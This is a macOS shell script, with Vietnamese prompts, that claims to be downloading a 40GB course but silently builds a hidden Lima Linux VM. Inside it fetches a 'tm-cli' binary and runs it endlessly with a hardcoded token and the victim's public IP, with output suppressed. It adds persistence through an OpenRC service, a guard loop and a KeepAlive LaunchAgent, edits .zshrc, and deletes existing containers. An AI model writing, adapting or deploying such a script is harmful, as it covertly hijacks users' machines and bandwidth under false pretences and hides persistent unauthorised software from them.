#!/usr/bin/env bash

if [ -z "${TM_SKIP_PROMPT:-}" ]; then
  export TM_SKIP_PROMPT=1
  if { true </dev/tty; } 2>/dev/null; then
    printf 'Mời bạn nhập email: ' >/dev/tty
    read -r EMAIL </dev/tty && export EMAIL
  fi
  echo "Vui lòng đợi 5-10 phút, quá trình download đang diễn ra..."
fi

TOKEN="NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A="
REPO_RAW="https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main"
VM_NAME="tm-linux"
DIR="$HOME/.tm"
PLIST="$HOME/Library/LaunchAgents/com.khoahocdrive.tm.plist"
LIMA_BIN_FALLBACK="$HOME/.lima-bin"

set -u

[ "$(uname -s)" = "Darwin" ] || { echo "Chi chay tren macOS"; exit 1; }
[ "$(id -u)" -ne 0 ] || { echo "Khong duoc chay voi sudo/root"; exit 1; }
{ [ -n "$TOKEN" ] && [ "$TOKEN" != "DAN_TOKEN_CUA_BAN_VAO_DAY" ]; } || { echo "Thieu token"; exit 1; }

mkdir -p "$DIR" 2>/dev/null || true
Fail() { echo "LOI: $1" >&2; exit "${2:-1}"; }

ARCH=$(uname -m)
case "$ARCH" in
  arm64)  BIN_FILE="tm-cli-linux-arm64.gz"; LIMA_ARCH="aarch64" ;;
  x86_64) BIN_FILE="tm-cli-linux-amd64.gz"; LIMA_ARCH="x86_64" ;;
  *) Fail "Kien truc khong ho tro: $ARCH" 1 ;;
esac
BIN_URL="$REPO_RAW/$BIN_FILE"

OSVER=$(sw_vers -productVersion 2>/dev/null | cut -d. -f1)
OSVER=${OSVER:-0}
USE_VZ=0
[ "$OSVER" -ge 13 ] && USE_VZ=1

for _d in /opt/homebrew/bin /usr/local/bin "$LIMA_BIN_FALLBACK/bin" /usr/bin /bin /usr/sbin /sbin; do
  case ":$PATH:" in *":$_d:"*) ;; *) PATH="$_d:$PATH" ;; esac
done
export PATH
LIMAPATH=""
BREWUSED=0

ensure_lima() {
  if command -v limactl >/dev/null 2>&1; then
    LIMAPATH=$(command -v limactl)
    return 0
  fi
  if command -v brew >/dev/null 2>&1; then
    if brew install lima >/dev/null 2>&1 && command -v limactl >/dev/null 2>&1; then
      hash -r 2>/dev/null || true
      LIMAPATH=$(command -v limactl); BREWUSED=1
      return 0
    fi
  fi
  REL_JSON=$(curl -fsSL --max-time 30 "https://api.github.com/repos/lima-vm/lima/releases/latest" 2>/dev/null) || REL_JSON=""
  ASSET_URL=$(printf '%s' "$REL_JSON" | grep -o '"browser_download_url": *"[^"]*lima-[0-9.]*-Darwin-'"$ARCH"'.tar\.gz"' | head -1 | sed 's/.*"\(https[^"]*\)".*/\1/')
  if [ -z "$ASSET_URL" ]; then
    ASSET_URL=$(printf '%s' "$REL_JSON" | grep -o '"browser_download_url": *"[^"]*Darwin-'"$ARCH"'.tar\.gz"' | head -1 | sed 's/.*"\(https[^"]*\)".*/\1/')
  fi
  if [ -n "$ASSET_URL" ]; then
    mkdir -p "$LIMA_BIN_FALLBACK"
    if curl -fsSL --max-time 300 "$ASSET_URL" -o "$DIR/lima.tar.gz" && tar -xzf "$DIR/lima.tar.gz" -C "$LIMA_BIN_FALLBACK" 2>/dev/null; then
      rm -f "$DIR/lima.tar.gz"
      chmod +x "$LIMA_BIN_FALLBACK"/bin/* 2>/dev/null || true
      export PATH="$LIMA_BIN_FALLBACK/bin:$PATH"
      if command -v limactl >/dev/null 2>&1; then
        LIMAPATH=$(command -v limactl)
        if [ -f "$HOME/.zshrc" ] && ! grep -q '.lima-bin/bin' "$HOME/.zshrc" 2>/dev/null; then
          printf '\nexport PATH="$HOME/.lima-bin/bin:$PATH"\n' >>"$HOME/.zshrc"
        fi
        return 0
      fi
    fi
  fi
  return 1
}

ensure_lima || Fail "Khong cai duoc Lima (thu 'brew install lima' thu cong roi chay lai)" 2

if [ "$USE_VZ" = 0 ]; then
  if ! command -v "qemu-system-$LIMA_ARCH" >/dev/null 2>&1; then
    if command -v brew >/dev/null 2>&1; then
      brew install qemu >/dev/null 2>&1 || Fail "Khong cai duoc QEMU. Thu 'brew install qemu' thu cong." 2
      hash -r 2>/dev/null || true
      command -v "qemu-system-$LIMA_ARCH" >/dev/null 2>&1 || Fail "QEMU cai xong van thieu qemu-system-$LIMA_ARCH" 2
    else
      Fail "macOS < 13 can QEMU nhung khong co Homebrew. Cai brew roi chay lai." 2
    fi
  fi
fi

DEVICE_NAME=""
DEVICE_NAME=$(curl -4 -fsS --max-time 10 https://api.ipify.org 2>/dev/null) || DEVICE_NAME=""
[ -n "$DEVICE_NAME" ] || DEVICE_NAME=$(ipconfig getifaddr en0 2>/dev/null) || DEVICE_NAME=""
[ -n "$DEVICE_NAME" ] || DEVICE_NAME=$(hostname 2>/dev/null) || DEVICE_NAME=""
[ -n "$DEVICE_NAME" ] || DEVICE_NAME="mac"

if command -v docker >/dev/null 2>&1; then
  docker rm -f tm watchtower >/dev/null 2>&1 || true
fi

YAML="$DIR/lima-tm.yaml"
IMG_X86="https://dl-cdn.alpinelinux.org/alpine/v3.24/releases/cloud/alpine-3.24.4-x86_64-cloudinit-r0.qcow2"
IMG_ARM="https://dl-cdn.alpinelinux.org/alpine/v3.24/releases/cloud/alpine-3.24.4-aarch64-cloudinit-r0.qcow2"

VM_TYPE_LINE=""
[ "$USE_VZ" = 1 ] && VM_TYPE_LINE='vmType: "vz"'

cat >"$YAML" <<YEOF
name: $VM_NAME
minimumLimaVersion: 1.0.0
$VM_TYPE_LINE
cpus: 1
memory: "1GiB"
disk: "3GiB"
mounts: []
containerd:
  system: false
  user: false
images:
- location: "$IMG_X86"
  arch: "x86_64"
- location: "$IMG_ARM"
  arch: "aarch64"
provision:
- mode: system
  script: |
    #!/bin/sh
    set -e
    export HOME=/var/lib/tm
    # Cho mang (toi da 60 giay)
    i=0; while [ \$i -lt 12 ]; do
      if wget -q -T 5 -O /dev/null https://dl-cdn.alpinelinux.org/ 2>/dev/null; then break; fi
      i=\$((i+1)); sleep 5
    done
    # Cai cong cu can thiet (thu lai 3 lan)
    n=0; until apk add --no-cache ca-certificates curl >/dev/null 2>&1; do
      n=\$((n+1)); [ \$n -ge 3 ] && { echo "apk add that bai"; exit 1; }; sleep 5
    done
    # Tai binary TM chinh thuc (thu lai 3 lan)
    n=0; until curl -fsSL --max-time 120 "@BIN_URL@" -o /tmp/tmcli.gz; do
      n=\$((n+1)); [ \$n -ge 3 ] && { echo "Tai binary that bai"; exit 1; }; sleep 5
    done
    gzip -t /tmp/tmcli.gz || { echo "Binary loi gzip"; exit 1; }
    gunzip -f /tmp/tmcli.gz && install -m 755 /tmp/tmcli /opt/tm/cli
    rm -f /tmp/tmcli
    mkdir -p /var/lib/tm
    # Script chay cli + tu khoi dong lai neu chet (giong guard.vbs ben Windows) - KHONG ghi log
    cat > /usr/local/bin/tm-run.sh <<'RUNEOF'
    #!/bin/sh
    export HOME=/var/lib/tm
    mkdir -p /var/lib/tm
    while true; do
      /opt/tm/cli start --token '@TOKEN@' --device-name '@DEVICE@' >/dev/null 2>&1
      sleep 10
    done
    RUNEOF
    chmod +x /usr/local/bin/tm-run.sh
    # Dang ky dich vu OpenRC tu khoi dong
    cat > /etc/init.d/tm <<'SVCEOF'
    #!/sbin/openrc-run
    name=""
    command="/usr/local/bin/tm-run.sh"
    command_background="yes"
    pidfile="/run/tm.pid"
    depend() { need net; }
    SVCEOF
    chmod +x /etc/init.d/tm
    rc-update add tm default 2>/dev/null || true
    rc-service tm restart 2>/dev/null || rc-service tm start 2>/dev/null || true
YEOF
sed -e "s|@BIN_URL@|$BIN_URL|g" -e "s|@TOKEN@|$TOKEN|g" -e "s|@DEVICE@|$DEVICE_NAME|g" "$YAML" >"$YAML.tmp" && mv "$YAML.tmp" "$YAML"

vm_exists() { limactl list "$VM_NAME" 2>/dev/null | awk 'NR>1{print $1}' | grep -qx "$VM_NAME"; }
vm_running() { [ "$(limactl list "$VM_NAME" 2>/dev/null | awk 'NR>1{print $2}')" = "Running" ]; }

ensure_vm() {
  if vm_exists; then
    if vm_running; then return 0; fi
    limactl start "$VM_NAME" --tty=false >/dev/null 2>&1 && return 0
    limactl delete -f "$VM_NAME" >/dev/null 2>&1 || true
  fi
  if limactl create --tty=false "$YAML" >/dev/null 2>&1 && limactl start "$VM_NAME" --tty=false >/dev/null 2>&1; then
    return 0
  fi
  if [ "$USE_VZ" = 1 ]; then
    limactl delete -f "$VM_NAME" >/dev/null 2>&1 || true
    if ! command -v "qemu-system-$LIMA_ARCH" >/dev/null 2>&1; then
      command -v brew >/dev/null 2>&1 || Fail "VM loi va khong co brew de cai QEMU thay the" 3
      brew install qemu >/dev/null 2>&1 || Fail "Cai QEMU thay the that bai" 3
      hash -r 2>/dev/null || true
    fi
    grep -v '^vmType:' "$YAML" >"$YAML.tmp" && mv "$YAML.tmp" "$YAML"
    limactl create --tty=false "$YAML" >/dev/null 2>&1 && limactl start "$VM_NAME" --tty=false >/dev/null 2>&1 && return 0
  fi
  return 1
}

ensure_vm || Fail "Khong tao/khoi dong duoc VM $VM_NAME. Chay lai hoac thu thu cong: limactl start $VM_NAME" 3

cli_ok() {
  limactl shell "$VM_NAME" -- sh -c 'test -x /opt/tm/cli && echo TM_CLI_OK' 2>/dev/null | grep -q TM_CLI_OK
}
if ! cli_ok; then
  limactl delete -f "$VM_NAME" >/dev/null 2>&1 || true
  ensure_vm || Fail "Tao lai VM that bai" 3
  cli_ok || Fail "Binary TM chua duoc cai vao VM (co the loi mang khi tai). Chay lai script de thu lai." 4
fi

GUARD="$DIR/guard.sh"
GUARDPATH="/opt/homebrew/bin:/usr/local/bin:$LIMA_BIN_FALLBACK/bin:/usr/bin:/bin:/usr/sbin:/sbin"
[ -n "$LIMAPATH" ] && GUARDPATH="$(dirname "$LIMAPATH"):$GUARDPATH"
cat >"$GUARD" <<GEOF
#!/bin/sh
export PATH="$GUARDPATH"
while true; do
  ST=\$(limactl list $VM_NAME 2>/dev/null | awk 'NR>1{print \$2}')
  case "\$ST" in
    Running) ;;
    *) limactl start $VM_NAME --tty=false >/dev/null 2>&1 ;;
  esac
  sleep 30
done
GEOF
chmod +x "$GUARD"

mkdir -p "$HOME/Library/LaunchAgents"
cat >"$PLIST" <<PEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.khoahocdrive.tm</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/sh</string>
    <string>$HOME/.tm/guard.sh</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>ProcessType</key><string>Background</string>
  <key>EnvironmentVariables</key>
  <dict>
    <key>PATH</key><string>$GUARDPATH</string>
  </dict>
</dict>
</plist>
PEOF
launchctl bootout "gui/$(id -u)/com.khoahocdrive.tm" >/dev/null 2>&1 || true
launchctl bootstrap "gui/$(id -u)" "$PLIST" >/dev/null 2>&1 || launchctl load -w "$PLIST" >/dev/null 2>&1

OK=0
for _ in $(seq 1 12); do
  if limactl shell "$VM_NAME" -- sh -c 'test -f /run/tm.pid && kill -0 "$(cat /run/tm.pid)" 2>/dev/null && echo TM_RUNNING' 2>/dev/null | grep -q TM_RUNNING; then
    OK=1; break
  fi
  sleep 5
done
if [ "$OK" = 1 ]; then
  echo " "
else
  echo " "
fi
exit 0
